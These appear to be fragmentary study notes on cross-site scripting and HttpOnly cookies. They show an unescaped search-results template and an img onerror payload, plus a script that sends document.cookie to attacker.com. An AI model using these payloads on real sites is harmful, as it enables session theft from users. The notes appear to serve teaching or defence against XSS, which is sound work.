 <h2>Search Results for: <img src="x" onerror="alert('Reflected XSS')"></h2>
        <div>${posts.map(post => 
          `<div>
            <h3>${post.title}</h3>
            <p>By: ${post.username}</p>
          </div>`
        ).join('')}</div>



<H1>
<img>
<div>

\<H1\>Jay Chakra\</h1\>


// HTTP Only Cookie
<script>
 fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

Set-Cookie: jwt=eyJhbGciOi...; HttpOnly; Secure;

```

fetch("/api/user", {
 method: "GET",
 credentials: "include",
});

```